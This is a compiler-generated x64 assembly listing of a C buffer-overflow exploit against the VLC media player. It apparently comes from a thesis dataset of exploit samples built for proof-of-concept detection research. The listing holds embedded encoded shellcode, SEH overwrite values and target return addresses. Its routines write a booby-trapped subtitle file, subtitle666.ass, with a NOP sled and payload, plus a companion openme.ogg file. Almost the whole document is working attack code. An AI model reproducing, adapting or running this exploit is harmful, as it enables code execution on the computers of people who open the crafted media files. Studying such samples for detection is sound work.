; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	vlcshellcode
PUBLIC	data
PUBLIC	banner
PUBLIC	arguments
PUBLIC	seh
PUBLIC	nseh
PUBLIC	RET
_DATA	SEGMENT
COMM	b:BYTE:0f4240H
COMM	c:BYTE:0f4240H
COMM	d:BYTE:0f4240H
COMM	f:BYTE:0f4240H
COMM	i:DWORD
COMM	input:DWORD
COMM	bf:BYTE:04H
COMM	t:DWORD
_DATA	ENDS
CONST	SEGMENT
?alphanum@?1??gen_random@@9@9 DB '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabc'
	DB	'defghijklmnopqrstuvwxyz', 00H		; `gen_random'::`2'::alphanum
CONST	ENDS
_DATA	SEGMENT
vlcshellcode DB	'1', 0c9H, 083H, 0e9H, 0deH, 0d9H, 0eeH, 0d9H, 't$', 0f4H
	DB	'[', 081H, 's', 013H, '=', 0baH, 0b1H, 0d9H, 083H, 0ebH, 0fcH, 0e2H
	DB	0f4H, 0c1H, 'R', 0f5H, 0d9H, '=', 0baH, ':', 09cH, 01H, '1', 0cdH
	DB	0dcH, 'E', 0bbH, '^Rr', 0a2H, ':', 086H, 01dH, 0bbH, 'Z', 090H
	DB	0b6H, 08eH, ':', 0d8H, 0d3H, 08bH, 'q@', 091H, '>q', 0adH, ':{'
	DB	'{', 0d4H, '<xZ-', 06H, 0eeH, 095H, 0ddH, 'H_:', 086H, 019H, 0bbH
	DB	'Z', 0bfH, 0b6H, 0b6H, 0faH, 'Rb', 0a6H, 0b0H, '2', 0b6H, 0a6H
	DB	':', 0d8H, 0d6H, '3', 0edH, 0fdH, '9y', 080H, 019H, 'Y1', 0f1H
	DB	0e9H, 0b8H, 'z', 0c9H, 0d5H, 0b6H, 0faH, 0bdH, 'RM', 0a6H, 01cH
	DB	'RU', 0b2H, 'Z', 0d0H, 0b6H, ':', 01H, 0d9H, '=', 0baH, ':', 0b1H
	DB	01H, 0e5H, 080H, '/]', 0ecH, '8!', 0beH, 'z', 0caH, 089H, 'U', 0c4H
	DB	'i;N', 0d2H, ')''', 0b7H, 0b4H, 0e6H, '&', 0daH, 0d9H, 0d0H, 0b5H
	DB	'^', 0baH, 0b1H, 0d9H, 00H
	ORG $+15
data	DB	'[Script Info]', 0aH, '; Script generated by Aegisub', 0aH
	DB	'; http://www.aegisub.net', 0aH, 'Title: Neon Genesis Evangeli'
	DB	'on - Episode 26 (neutral Spanish)', 0aH, 'Original Script: Ro'
	DB	'Ro', 0aH, 'Script Updated By: version 2.8.01', 0aH, 'ScriptTy'
	DB	'pe: v4.00+', 0aH, 'Collisions: Normal', 0aH, 'PlayResY: 600', 0aH
	DB	'PlayDepth: 0', 0aH, 'Timer: 100,0000', 0aH, 'Video Aspect Rat'
	DB	'io: 0', 0aH, 'Video Zoom: 6', 0aH, 'Video Position: 0', 0aH, '['
	DB	'V4+ Styles]', 0aH, 'Format: Name, Fontname, Fontsize, Primary'
	DB	'Colour, SecondaryColour, OutlineColour, BackColour, Bold, Ita'
	DB	'lic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, Bo'
	DB	'rderStyle, Outline, Shadow, Alignment, MarginL, MarginR, Marg'
	DB	'inV, Encoding', 0aH, 'Style: DefaultVCD, Arial,28,&H00B4FCFC,'
	DB	'&H00B4FCFC,&H00000008,&H80000008,-1,0,0,0,100,100,0.00,0.00,1'
	DB	',1.00,2.00,2,30,30,30,0', 0aH, '[Events]', 0aH, 'Format: Laye'
	DB	'r, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect'
	DB	', Text', 0aH, 'Dialogue:AAAAAAAAAAAAAAAA', 00H
	ORG $+4
banner	DB	'********************************************************'
	DB	'**********', 0aH, '       VLC 0.6.8x Buffer overflow exploit('
	DB	'win32 universal)      *', 0aH, '                             '
	DB	'                                    *', 0aH, '               '
	DB	'           by fl0 fl0w                            *', 0aH, '*'
	DB	'*************************************************************'
	DB	'****', 0aH, 00H
	ORG $+1
arguments DB	'---------------------------', 0aH, 'Too few args!       '
	DB	'       ', 0aH, 'sploit.exe [target 1/2/3/4]', 0aH, '---------'
	DB	'------------------', 0aH, 00H
	ORG $+3
seh	DB	087H, 'u@K', 00H
	ORG $+3
nseh	DB	'8', 0faH, 't', 02H, 00H
	ORG $+7
$SG9934	DB	'VLC 0.8.6       c', 00H
	ORG $+6
RET	DD	026dfa38H
	ORG $+4
	DQ	FLAT:$SG9934
	DD	0263fa38H
	ORG $+4
	DQ	FLAT:$SG9935
	DD	0267fa38H
	ORG $+4
	DQ	FLAT:$SG9936
	DD	0267fa38H
	ORG $+4
	DQ	FLAT:$SG9937
	DD	02b6fa38H
	ORG $+4
	DQ	FLAT:$SG9938
	DD	00H
	ORG $+4
	DQ	0000000000000000H
$SG9935	DB	'VLC 0.8.6     b,d', 00H
	ORG $+6
$SG9936	DB	'VLC 0.8.6       a', 00H
	ORG $+6
$SG9937	DB	'VLC 0.8.6 b test1', 00H
	ORG $+6
$SG9938	DB	'VLC 0.8.6     RC1', 00H
_DATA	ENDS
PUBLIC	__local_stdio_printf_options
PUBLIC	_vfprintf_l
PUBLIC	fprintf
PUBLIC	printf
PUBLIC	buildF
PUBLIC	cpy
PUBLIC	print
PUBLIC	gen_random
PUBLIC	getFsize
PUBLIC	cpystr
PUBLIC	oggf
PUBLIC	Targetprint
PUBLIC	main
PUBLIC	reverseInt
EXTRN	__acrt_iob_func:PROC
EXTRN	fclose:PROC
EXTRN	fopen:PROC
EXTRN	fseek:PROC
EXTRN	ftell:PROC
EXTRN	fwrite:PROC
EXTRN	getchar:PROC
EXTRN	__stdio_common_vfprintf:PROC
EXTRN	memcpy:PROC
EXTRN	memset:PROC
EXTRN	strlen:PROC
EXTRN	system:PROC
EXTRN	exit:PROC
EXTRN	atoi:PROC
EXTRN	free:PROC
EXTRN	malloc:PROC
EXTRN	rand:PROC
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$_vfprintf_l DD imagerel $LN3
	DD	imagerel $LN3+67
	DD	imagerel $unwind$_vfprintf_l
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$fprintf DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$fprintf
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$printf DD imagerel $LN3
	DD	imagerel $LN3+87
	DD	imagerel $unwind$printf
pdata	ENDS
pdata	SEGMENT
$pdata$buildF DD imagerel $LN4
	DD	imagerel $LN4+274
	DD	imagerel $unwind$buildF
$pdata$cpy DD	imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$cpy
$pdata$print DD	imagerel $LN3
	DD	imagerel $LN3+31
	DD	imagerel $unwind$print
$pdata$gen_random DD imagerel $LN6
	DD	imagerel $LN6+119
	DD	imagerel $unwind$gen_random
$pdata$getFsize DD imagerel $LN4
	DD	imagerel $LN4+104
	DD	imagerel $unwind$getFsize
$pdata$cpystr DD imagerel $LN3
	DD	imagerel $LN3+52
	DD	imagerel $unwind$cpystr
$pdata$oggf DD	imagerel $LN4
	DD	imagerel $LN4+245
	DD	imagerel $unwind$oggf
$pdata$Targetprint DD imagerel $LN6
	DD	imagerel $LN6+132
	DD	imagerel $unwind$Targetprint
$pdata$main DD	imagerel $LN11
	DD	imagerel $LN11+521
	DD	imagerel $unwind$main
$pdata$reverseInt DD imagerel $LN5
	DD	imagerel $LN5+124
	DD	imagerel $unwind$reverseInt
pdata	ENDS
_DATA	SEGMENT
	ORG $+2
$SG9952	DB	'CLS', 00H
$SG9953	DB	'%s%s', 00H
	ORG $+3
$SG9959	DB	'[!]Using : %s retaddress', 0aH, 00H
	ORG $+2
$SG9967	DB	'wb', 00H
	ORG $+1
$SG9960	DB	'openme.ogg', 00H
	ORG $+1
$SG9983	DB	'wb', 00H
	ORG $+1
$SG9968	DB	'subtitle666.ass', 00H
$SG9970	DB	'File .ass error!', 00H
	ORG $+3
$SG9971	DB	'%s%s', 00H
	ORG $+3
$SG9997	DB	'[*]%s', 0aH, 00H
	ORG $+1
$SG10016 DB	'rb', 00H
	ORG $+1
$SG9972	DB	'subtitle666.ass', 00H
$SG9973	DB	'[#]ASS file DONE!', 0aH, 00H
	ORG $+5
$SG9985	DB	'File ogg error', 00H
	ORG $+1
$SG9986	DB	'openme.ogg', 00H
	ORG $+5
$SG9987	DB	'[#]OGG file DONE!', 0aH, 00H
	ORG $+5
$SG10018 DB	'File error at reading', 00H
	ORG $+2
$SG10043 DB	'Targets are:', 00H
	ORG $+3
$SG10044 DB	'[!]%s - [0x%d] - %d', 0aH, 00H
_DATA	ENDS
xdata	SEGMENT
$unwind$buildF DD 010801H
	DD	06208H
$unwind$cpy DD	010d01H
	DD	0620dH
$unwind$print DD 010901H
	DD	04209H
$unwind$gen_random DD 010d01H
	DD	0420dH
$unwind$getFsize DD 010e01H
	DD	0620eH
$unwind$cpystr DD 011201H
	DD	04212H
$unwind$oggf DD	010901H
	DD	06209H
$unwind$Targetprint DD 010401H
	DD	06204H
$unwind$main DD	010d01H
	DD	0620dH
$unwind$reverseInt DD 010801H
	DD	02208H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$printf DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$fprintf DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$_vfprintf_l DD 011801H
	DD	06218H
xdata	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
c1$ = 0
c2$ = 1
c3$ = 2
c4$ = 3
i$ = 32
reverseInt PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 274
$LN5:
	mov	DWORD PTR [rsp+8], ecx
	sub	rsp, 24
; Line 277
	movsx	eax, BYTE PTR i$[rsp]
	test	eax, eax
	jne	SHORT $LN2@reverseInt
; Line 279
	mov	eax, DWORD PTR i$[rsp]
	jmp	SHORT $LN1@reverseInt
; Line 280
	jmp	SHORT $LN3@reverseInt
$LN2@reverseInt:
; Line 282
	mov	eax, DWORD PTR i$[rsp]
	and	eax, 255				; 000000ffH
	mov	BYTE PTR c1$[rsp], al
; Line 283
	mov	eax, DWORD PTR i$[rsp]
	shr	eax, 8
	and	eax, 255				; 000000ffH
	mov	BYTE PTR c2$[rsp], al
; Line 284
	mov	eax, DWORD PTR i$[rsp]
	shr	eax, 16
	and	eax, 255				; 000000ffH
	mov	BYTE PTR c3$[rsp], al
; Line 285
	mov	eax, DWORD PTR i$[rsp]
	shr	eax, 24
	and	eax, 255				; 000000ffH
	mov	BYTE PTR c4$[rsp], al
; Line 286
	movzx	eax, BYTE PTR c1$[rsp]
	shl	eax, 24
	movzx	ecx, BYTE PTR c2$[rsp]
	shl	ecx, 16
	add	eax, ecx
	movzx	ecx, BYTE PTR c3$[rsp]
	shl	ecx, 8
	add	eax, ecx
	movzx	ecx, BYTE PTR c4$[rsp]
	add	eax, ecx
$LN3@reverseInt:
$LN1@reverseInt:
; Line 288
	add	rsp, 24
	ret	0
reverseInt ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
tv74 = 32
argc$ = 64
argv$ = 72
main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 143
$LN11:
	mov	QWORD PTR [rsp+16], rdx
	mov	DWORD PTR [rsp+8], ecx
	sub	rsp, 56					; 00000038H
; Line 144
	cmp	DWORD PTR argc$[rsp], 2
	jge	SHORT $LN4@main
; Line 146
	lea	rcx, OFFSET FLAT:$SG9952
	call	system
; Line 148
	lea	r8, OFFSET FLAT:arguments
	lea	rdx, OFFSET FLAT:banner
	lea	rcx, OFFSET FLAT:$SG9953
	call	printf
; Line 150
	call	Targetprint
	xor	ecx, ecx
	call	exit
$LN4@main:
; Line 153
	mov	eax, 8
	imul	rax, rax, 1
	mov	rcx, QWORD PTR argv$[rsp]
	mov	rcx, QWORD PTR [rcx+rax]
	call	atoi
	mov	DWORD PTR input, eax
; Line 155
	mov	eax, DWORD PTR input
	mov	DWORD PTR tv74[rsp], eax
	cmp	DWORD PTR tv74[rsp], 0
	je	SHORT $LN5@main
	cmp	DWORD PTR tv74[rsp], 1
	je	SHORT $LN6@main
	cmp	DWORD PTR tv74[rsp], 2
	je	$LN7@main
	cmp	DWORD PTR tv74[rsp], 3
	je	$LN8@main
	cmp	DWORD PTR tv74[rsp], 4
	je	$LN9@main
	jmp	$LN2@main
$LN5@main:
; Line 158
	mov	eax, 16
	imul	rax, rax, 0
	lea	rcx, OFFSET FLAT:RET
	mov	ecx, DWORD PTR [rcx+rax]
	call	reverseInt
; Line 159
	mov	eax, 16
	imul	rax, rax, 0
	lea	rcx, OFFSET FLAT:RET
	lea	rdx, OFFSET FLAT:bf
	mov	ecx, DWORD PTR [rcx+rax]
	call	cpy
; Line 160
	jmp	$LN2@main
$LN6@main:
; Line 163
	mov	eax, 16
	imul	rax, rax, 1
	lea	rcx, OFFSET FLAT:RET
	mov	ecx, DWORD PTR [rcx+rax]
	call	reverseInt
; Line 164
	mov	eax, 16
	imul	rax, rax, 1
	lea	rcx, OFFSET FLAT:RET
	lea	rdx, OFFSET FLAT:bf
	mov	ecx, DWORD PTR [rcx+rax]
	call	cpy
; Line 165
	jmp	$LN2@main
$LN7@main:
; Line 168
	mov	eax, 16
	imul	rax, rax, 2
	lea	rcx, OFFSET FLAT:RET
	mov	ecx, DWORD PTR [rcx+rax]
	call	reverseInt
; Line 169
	mov	eax, 16
	imul	rax, rax, 2
	lea	rcx, OFFSET FLAT:RET
	lea	rdx, OFFSET FLAT:bf
	mov	ecx, DWORD PTR [rcx+rax]
	call	cpy
; Line 170
	jmp	SHORT $LN2@main
$LN8@main:
; Line 173
	mov	eax, 16
	imul	rax, rax, 3
	lea	rcx, OFFSET FLAT:RET
	mov	ecx, DWORD PTR [rcx+rax]
	call	reverseInt
; Line 174
	mov	eax, 16
	imul	rax, rax, 3
	lea	rcx, OFFSET FLAT:RET
	lea	rdx, OFFSET FLAT:bf
	mov	ecx, DWORD PTR [rcx+rax]
	call	cpy
; Line 175
	jmp	SHORT $LN2@main
$LN9@main:
; Line 178
	mov	eax, 16
	imul	rax, rax, 4
	lea	rcx, OFFSET FLAT:RET
	mov	ecx, DWORD PTR [rcx+rax]
	call	reverseInt
; Line 179
	mov	eax, 16
	imul	rax, rax, 4
	lea	rcx, OFFSET FLAT:RET
	lea	rdx, OFFSET FLAT:bf
	mov	ecx, DWORD PTR [rcx+rax]
	call	cpy
$LN2@main:
; Line 182
	movsxd	rax, DWORD PTR input
	imul	rax, rax, 16
	lea	rcx, OFFSET FLAT:RET
	mov	rdx, QWORD PTR [rcx+rax+8]
	lea	rcx, OFFSET FLAT:$SG9959
	call	printf
; Line 183
	lea	rcx, OFFSET FLAT:b
	call	buildF
	lea	rcx, OFFSET FLAT:$SG9960
	call	oggf
	call	getchar
; Line 185
	xor	eax, eax
; Line 186
	add	rsp, 56					; 00000038H
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
tv80 = 32
Targetprint PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 295
$LN6:
	sub	rsp, 56					; 00000038H
; Line 296
	lea	rcx, OFFSET FLAT:$SG10043
	call	print
; Line 297
	mov	DWORD PTR t, 0
	jmp	SHORT $LN4@Targetprin
$LN2@Targetprin:
	mov	eax, DWORD PTR t
	inc	eax
	mov	DWORD PTR t, eax
$LN4@Targetprin:
	cmp	DWORD PTR t, 5
	jge	SHORT $LN3@Targetprin
; Line 298
	movsxd	rax, DWORD PTR t
	imul	rax, rax, 16
	lea	rcx, OFFSET FLAT:RET
	movsxd	rdx, DWORD PTR t
	imul	rdx, rdx, 16
	lea	r8, OFFSET FLAT:RET
	mov	QWORD PTR tv80[rsp], r8
	mov	r9d, DWORD PTR t
	mov	r8d, DWORD PTR [rcx+rax]
	mov	rax, QWORD PTR tv80[rsp]
	mov	rdx, QWORD PTR [rax+rdx+8]
	lea	rcx, OFFSET FLAT:$SG10044
	call	printf
	jmp	SHORT $LN2@Targetprin
$LN3@Targetprin:
; Line 299
	add	rsp, 56					; 00000038H
	ret	0
Targetprint ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
W666$ = 32
g$ = 40
fname$ = 64
oggf	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 208
$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
; Line 209
	lea	rdx, OFFSET FLAT:$SG9983
	mov	rcx, QWORD PTR fname$[rsp]
	call	fopen
	mov	QWORD PTR g$[rsp], rax
; Line 210
	cmp	QWORD PTR g$[rsp], 0
	jne	SHORT $LN2@oggf
; Line 212
	lea	rcx, OFFSET FLAT:$SG9985
	call	print
; Line 213
	xor	ecx, ecx
	call	exit
$LN2@oggf:
; Line 216
	mov	ecx, 32					; 00000020H
	call	malloc
	cdqe
	mov	QWORD PTR W666$[rsp], rax
; Line 217
	mov	rax, QWORD PTR W666$[rsp]
	mov	DWORD PTR [rax], 1399285583		; 5367674fH
; Line 218
	mov	rax, QWORD PTR W666$[rsp]
	mov	BYTE PTR [rax+4], 0
; Line 219
	mov	rax, QWORD PTR W666$[rsp]
	mov	BYTE PTR [rax+5], 2
; Line 220
	mov	rax, QWORD PTR W666$[rsp]
	mov	QWORD PTR [rax+8], 0
; Line 221
	mov	rax, QWORD PTR W666$[rsp]
	mov	DWORD PTR [rax+16], 24760		; 000060b8H
; Line 222
	mov	rax, QWORD PTR W666$[rsp]
	mov	DWORD PTR [rax+20], 0
; Line 223
	mov	rax, QWORD PTR W666$[rsp]
	mov	DWORD PTR [rax+24], -1543253256		; a403d2f8H
; Line 224
	mov	rax, QWORD PTR W666$[rsp]
	mov	BYTE PTR [rax+28], 1
; Line 225
	mov	rax, QWORD PTR W666$[rsp]
	mov	BYTE PTR [rax+29], 30
; Line 227
	mov	r9, QWORD PTR g$[rsp]
	mov	r8d, 9
	mov	edx, 8
	mov	rcx, QWORD PTR W666$[rsp]
	call	fwrite
; Line 229
	mov	rcx, QWORD PTR g$[rsp]
	call	fclose
; Line 231
	lea	rdx, OFFSET FLAT:$SG9986
	mov	rcx, QWORD PTR g$[rsp]
	call	getFsize
	mov	edx, eax
	lea	rcx, OFFSET FLAT:$SG9987
	call	printf
; Line 233
	xor	eax, eax
; Line 234
	add	rsp, 56					; 00000038H
	ret	0
oggf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
dest$ = 48
str$ = 56
len$ = 64
cpystr	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 290
$LN3:
	mov	DWORD PTR [rsp+24], r8d
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
; Line 291
	mov	eax, DWORD PTR len$[rsp]
	inc	eax
	cdqe
	mov	r8, rax
	mov	edx, DWORD PTR str$[rsp]
	mov	rcx, QWORD PTR dest$[rsp]
	call	memset
; Line 292
	mov	eax, DWORD PTR len$[rsp]
; Line 293
	add	rsp, 40					; 00000028H
	ret	0
cpystr	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
s$ = 32
g$ = 64
gname$ = 72
getFsize PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 258
$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
; Line 261
	lea	rdx, OFFSET FLAT:$SG10016
	mov	rcx, QWORD PTR gname$[rsp]
	call	fopen
	mov	QWORD PTR g$[rsp], rax
; Line 263
	cmp	QWORD PTR g$[rsp], 0
	jne	SHORT $LN2@getFsize
; Line 265
	lea	rcx, OFFSET FLAT:$SG10018
	call	print
; Line 266
	xor	ecx, ecx
	call	exit
$LN2@getFsize:
; Line 268
	mov	r8d, 2
	xor	edx, edx
	mov	rcx, QWORD PTR g$[rsp]
	call	fseek
; Line 269
	mov	rcx, QWORD PTR g$[rsp]
	call	ftell
	mov	DWORD PTR s$[rsp], eax
; Line 271
	mov	eax, DWORD PTR s$[rsp]
; Line 272
	add	rsp, 56					; 00000038H
	ret	0
getFsize ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
s$ = 48
len$ = 56
gen_random PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 248
$LN6:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
; Line 251
	mov	DWORD PTR i, 0
	jmp	SHORT $LN4@gen_random
$LN2@gen_random:
	mov	eax, DWORD PTR i
	inc	eax
	mov	DWORD PTR i, eax
$LN4@gen_random:
	mov	eax, DWORD PTR len$[rsp]
	cmp	DWORD PTR i, eax
	jge	SHORT $LN3@gen_random
; Line 253
	call	rand
	cdqe
	xor	edx, edx
	mov	ecx, 62					; 0000003eH
	div	rcx
	mov	rax, rdx
	lea	rcx, OFFSET FLAT:?alphanum@?1??gen_random@@9@9
	movsxd	rdx, DWORD PTR i
	mov	r8, QWORD PTR s$[rsp]
	movzx	eax, BYTE PTR [rcx+rax]
	mov	BYTE PTR [r8+rdx], al
; Line 254
	jmp	SHORT $LN2@gen_random
$LN3@gen_random:
; Line 255
	movsxd	rax, DWORD PTR len$[rsp]
	mov	rcx, QWORD PTR s$[rsp]
	mov	BYTE PTR [rcx+rax], 0
; Line 256
	add	rsp, 40					; 00000028H
	ret	0
gen_random ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
msg$ = 48
print	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 243
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
; Line 244
	mov	rdx, QWORD PTR msg$[rsp]
	lea	rcx, OFFSET FLAT:$SG9997
	call	printf
; Line 245
	add	rsp, 40					; 00000028H
	ret	0
print	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
len$ = 32
source$ = 64
dest$ = 72
cpy	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 236
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	DWORD PTR [rsp+8], ecx
	sub	rsp, 56					; 00000038H
; Line 238
	mov	DWORD PTR len$[rsp], 4
; Line 239
	mov	eax, DWORD PTR len$[rsp]
	inc	eax
	cdqe
	mov	r8, rax
	lea	rdx, QWORD PTR source$[rsp]
	mov	rcx, QWORD PTR dest$[rsp]
	call	memcpy
; Line 240
	mov	eax, DWORD PTR len$[rsp]
; Line 241
	add	rsp, 56					; 00000038H
	ret	0
cpy	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
f$ = 32
retn$ = 64
buildF	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp1.c
; Line 188
$LN4:
	mov	DWORD PTR [rsp+8], ecx
	sub	rsp, 56					; 00000038H
; Line 189
	lea	rdx, OFFSET FLAT:$SG9967
	lea	rcx, OFFSET FLAT:$SG9968
	call	fopen
	mov	QWORD PTR f$[rsp], rax
; Line 191
	cmp	QWORD PTR f$[rsp], 0
	jne	SHORT $LN2@buildF
; Line 193
	lea	rcx, OFFSET FLAT:$SG9970
	call	print
	xor	ecx, ecx
	call	exit
$LN2@buildF:
; Line 194
	mov	edx, 165267				; 00028593H
	lea	rcx, OFFSET FLAT:b
	call	gen_random
; Line 195
	lea	rax, OFFSET FLAT:b
	add	rax, 163852				; 0002800cH
	mov	r8d, 4
	lea	rdx, OFFSET FLAT:bf
	mov	rcx, rax
	call	memcpy
; Line 196
	lea	rax, OFFSET FLAT:b
	add	rax, 163856				; 00028010H
	mov	r8d, 10
	mov	edx, 144				; 00000090H
	mov	rcx, rax
	call	memset
; Line 197
	lea	rcx, OFFSET FLAT:vlcshellcode
	call	strlen
	lea	rcx, OFFSET FLAT:b
	add	rcx, 163866				; 0002801aH
	mov	r8, rax
	lea	rdx, OFFSET FLAT:vlcshellcode
	call	memcpy
; Line 199
	lea	r9, OFFSET FLAT:b
	lea	r8, OFFSET FLAT:data
	lea	rdx, OFFSET FLAT:$SG9971
	mov	rcx, QWORD PTR f$[rsp]
	call	fprintf
; Line 201
	lea	rcx, OFFSET FLAT:data
	call	free
	mov	rcx, QWORD PTR f$[rsp]
	call	fclose
; Line 203
	lea	rdx, OFFSET FLAT:$SG9972
	mov	rcx, QWORD PTR f$[rsp]
	call	getFsize
	mov	edx, eax
	lea	rcx, OFFSET FLAT:$SG9973
	call	printf
; Line 205
	xor	eax, eax
; Line 206
	add	rsp, 56					; 00000038H
	ret	0
buildF	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT printf
_TEXT	SEGMENT
_Result$ = 32
_ArgList$ = 40
_Format$ = 64
printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+32], r9
	sub	rsp, 56					; 00000038H
; Line 959
	lea	rax, QWORD PTR _Format$[rsp+8]
	mov	QWORD PTR _ArgList$[rsp], rax
; Line 960
	mov	ecx, 1
	call	__acrt_iob_func
	mov	r9, QWORD PTR _ArgList$[rsp]
	xor	r8d, r8d
	mov	rdx, QWORD PTR _Format$[rsp]
	mov	rcx, rax
	call	_vfprintf_l
	mov	DWORD PTR _Result$[rsp], eax
; Line 961
	mov	QWORD PTR _ArgList$[rsp], 0
; Line 962
	mov	eax, DWORD PTR _Result$[rsp]
; Line 963
	add	rsp, 56					; 00000038H
	ret	0
printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT fprintf
_TEXT	SEGMENT
_Result$ = 32
_ArgList$ = 40
_Stream$ = 64
_Format$ = 72
fprintf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 837
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+32], r9
	sub	rsp, 56					; 00000038H
; Line 840
	lea	rax, QWORD PTR _Format$[rsp+8]
	mov	QWORD PTR _ArgList$[rsp], rax
; Line 841
	mov	r9, QWORD PTR _ArgList$[rsp]
	xor	r8d, r8d
	mov	rdx, QWORD PTR _Format$[rsp]
	mov	rcx, QWORD PTR _Stream$[rsp]
	call	_vfprintf_l
	mov	DWORD PTR _Result$[rsp], eax
; Line 842
	mov	QWORD PTR _ArgList$[rsp], 0
; Line 843
	mov	eax, DWORD PTR _Result$[rsp]
; Line 844
	add	rsp, 56					; 00000038H
	ret	0
fprintf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _vfprintf_l
_TEXT	SEGMENT
_Stream$ = 64
_Format$ = 72
_Locale$ = 80
_ArgList$ = 88
_vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
; Line 645
	call	__local_stdio_printf_options
	mov	rcx, QWORD PTR _ArgList$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Locale$[rsp]
	mov	r8, QWORD PTR _Format$[rsp]
	mov	rdx, QWORD PTR _Stream$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	__stdio_common_vfprintf
; Line 646
	add	rsp, 56					; 00000038H
	ret	0
_vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __local_stdio_printf_options
_TEXT	SEGMENT
__local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 92
	lea	rax, OFFSET FLAT:?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	ret	0
__local_stdio_printf_options ENDP
_TEXT	ENDS
END
